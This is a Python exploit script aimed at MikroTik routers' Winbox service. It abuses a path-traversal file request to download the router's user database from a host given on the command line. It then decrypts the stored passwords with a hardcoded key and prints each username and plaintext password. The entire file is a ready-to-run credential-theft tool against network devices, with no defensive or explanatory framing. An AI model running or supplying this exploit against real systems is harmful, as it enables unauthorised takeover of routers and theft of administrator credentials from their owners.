#!/usr/bin/env python3

import sys
from winbox.session import *
from winbox.filerequest import *

TIMEOUT = 10
USER_DAT_PATH = './.././.././.././.././../rw/store/user.dat'
port = 8291

def decrypt_password(user, pass_enc):
	key = hashlib.md5(user + b'283i4jfkai3389').digest()
	passw = ''
	for i in range(0, len(pass_enc)):
		passw += chr(pass_enc[i] ^ key[i % len(key)])
	return passw.split('\x00')[0]

def extract_user_pass_from_entry(entry):
	user_data = entry.split(b'\x01\x00\x00\x21')[1]
	pass_data = entry.split(b'\x11\x00\x00\x21')[1]
	user_len = user_data[0]
	pass_len = pass_data[0]
	username = user_data[1:1 + user_len]
	password = pass_data[1:1 + pass_len]
	return username, password

def get_pair(data):
	user_list = []
	entries = data.split(M2_HEADER)[1:]
	for entry in entries:
		try:
			user, pass_encrypted = extract_user_pass_from_entry(entry)
		except:
			continue
		pass_plain = decrypt_password(user, pass_encrypted)
		user  = user.decode('ascii')
		user_list.append((user, pass_plain))
	return user_list

if __name__ == '__main__':
	if len(sys.argv) < 2:
		print('Usage: %s <host>' % sys.argv[0])
		exit(0)

	host_port = sys.argv[1].split(':')
	host = host_port[0]
	if len(host_port) == 2: port = int(host_port[1])
	try:
		session = mtWinboxSession(host, port, timeout = TIMEOUT)
		freq = mtFileRequest(session, USER_DAT_PATH.encode())
		freq.request_download_list()
		user_dat = freq.download()
	except:
		session.close()
		exit(1)
	session.close()
	user_pass = get_pair(user_dat)
	for u, p in user_pass:
		print('%s\t%s\t%s' % (host, u, p))
